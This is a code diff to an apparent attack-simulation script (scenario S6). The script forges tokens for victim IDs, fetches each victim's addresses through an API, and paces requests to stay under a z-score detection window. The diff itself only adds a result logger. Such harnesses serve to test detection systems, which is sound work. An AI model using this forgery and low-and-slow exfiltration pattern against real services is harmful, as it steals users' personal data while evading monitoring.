@@ -28,6 +28,7 @@ sys.path.insert(0, str(_ROOT))
 from lib.token_forge import forge_token
 from lib.target_pool import get_shuffled_pool
 from lib.http_client import get_session, call_api
+from lib.result_writer import ResultWriter
 
 load_dotenv(_ROOT / ".env")
 
@@ -53,8 +54,7 @@ def run_s6(
 
     start_time = time.time()
     end_time = start_time + duration_hours * 3600
-    request_count = 0
-    success_count = 0
+    writer = ResultWriter("S6")
 
     print(
         f"[S6] 시작 — duration={duration_hours}h, "
@@ -71,33 +71,23 @@ def run_s6(
 
             victim_id = pool[pool_idx]
             token = forge_token(victim_id)
+            path = f"/api/addresses/{victim_id}"
 
             try:
-                resp = call_api(session, f"/api/addresses/{victim_id}", token, src_ip=src_ip)
-                request_count += 1
-                if resp.status_code == 200:
-                    success_count += 1
-
-                if request_count % 30 == 0:
-                    elapsed_h = (time.time() - start_time) / 3600
-                    print(
-                        f"[S6] t={elapsed_h:.2f}h  req={request_count}  "
-                        f"ok={success_count}  sub={victim_id}"
-                    )
-
+                resp = call_api(session, path, token, src_ip=src_ip)
+                writer.record(victim_id, src_ip, "GET", path, resp)
             except Exception as e:
-                print(f"[S6] error sub={victim_id}: {e}")
+                writer.record_error(victim_id, src_ip, path, e)
 
             pool_idx += 1
             # 분당 1~2건 — 5분 윈도우 z-score 미달 페이스
             time.sleep(random.uniform(min_interval, max_interval))
     except KeyboardInterrupt:
         print(f"\n[S6] 사용자 중단")
+    finally:
+        writer.close()
 
-    print(
-        f"[S6] 종료 — 총 {request_count} 요청, {success_count} 성공, "
-        f"{pool_idx}명 점진 유출"
-    )
+    print(f"[S6] 종료 — {pool_idx}명 점진 유출")
 
 
 if __name__ == "__main__":
